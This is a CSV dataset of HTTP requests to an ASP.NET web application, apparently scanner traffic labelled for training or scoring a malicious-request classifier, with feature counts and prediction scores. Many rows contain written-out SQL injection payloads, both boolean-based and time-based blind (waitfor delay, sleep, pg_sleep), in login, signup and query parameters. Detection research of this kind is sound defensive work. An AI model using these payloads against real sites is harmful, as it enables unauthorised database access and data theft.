,method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class,prediction_label,prediction_score
244,POST,/login.aspx?ReturnUrl=1ACUSTART%5c,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=xecqewwc&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad,good,0.6193
245,GET,/logout.aspx,,0,0,0,0,0,0,bad,good,0.6193
246,GET,/default.aspx?delete=1ACUSTART%5c,,0,0,0,0,0,0,bad,good,0.6193
247,GET,"/login.aspx?ReturnUrl=-1""%20OR%202%2b786-786-1=0%2b0%2b0%2b1%20--%20",,0,1,1,0,4,0,bad,bad,0.9886
248,POST,/login.aspx?ReturnUrl=/logout.aspx,btnLogin=Login&cbPersistCookie=-1'%20OR%202%2b699-699-1=0%2b0%2b0%2b1%20--%20&tbPassword=g00dPa%24%24w0rD&tbUsername=jmfyqjyt&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,1,0,1,0,4,0,bad,bad,0.9994
249,GET,/jscripts/tiny_mce/utils/mctabs.js,,0,0,0,0,0,0,bad,good,0.6193
250,POST,/login.aspx,"btnLogin=Login&cbPersistCookie=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&tbPassword=g00dPa%24%24w0rD&tbUsername=xklatmka&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB",0,2,0,5,0,1,bad,bad,0.993
251,POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=-1'%20OR%203*2=6%20AND%20276=276%20--%20&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,1,0,1,0,6,0,bad,bad,0.9999
252,GET,/jscripts/tiny_mce/themes/simple/editor_template_src.js,,0,0,0,0,0,0,bad,good,0.6193
253,POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=KoZzeo4p'));%20waitfor%20delay%20'0:0:9'%20--%20&tbUsername=eshppwte&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,3,0,1,0,7,2,bad,bad,1
254,GET,"/login.aspx?ReturnUrl=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/",,2,2,0,15,0,9,bad,bad,1
255,POST,/login.aspx,btnLogin=Login&cbPersistCookie=1%20waitfor%20delay%20'0:0:9'%20--%20&tbPassword=g00dPa%24%24w0rD&tbUsername=xklatmka&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,2,0,1,0,5,2,bad,bad,1
256,POST,/login.aspx?ReturnUrl=/postnews.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=fxgrikvg&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad,good,0.6193
257,POST,/login.aspx,"btnLogin=Login&tbPassword=1ACUSTART'""G5h9XACUEND&tbUsername=vfprmxgb&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB",1,1,0,0,0,0,bad,bad,0.8834
258,POST,/login.aspx?ReturnUrl=/logout.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=1acuuQiLPgoyQV&tbUsername=rmpfxtqu&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad,good,0.6193
259,GET,/login.aspx?ReturnUrl=-1'%20OR%202%2b632-632-1=0%2b0%2b0%2b1%20or%20'iuZMlHBJ'=',,4,0,0,0,4,0,bad,bad,1
260,GET,/jscripts/tiny_mce/tiny_mce.js,,0,0,0,0,0,0,bad,good,0.6193
261,POST,/login.aspx?ReturnUrl=/logout.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=1acugsy4iMubmK&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad,good,0.6193
262,GET,/default.aspx?delete=mFY72S0q';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad,bad,1
263,POST,/login.aspx?ReturnUrl=/logout.aspx,btnLogin=Login&cbPersistCookie=-1%20OR%202%2b130-130-1=0%2b0%2b0%2b1%20--%20&tbPassword=g00dPa%24%24w0rD&tbUsername=jmfyqjyt&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,1,0,4,0,bad,bad,0.9908
264,GET,/readnews.aspx?id=-1;%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad,bad,1
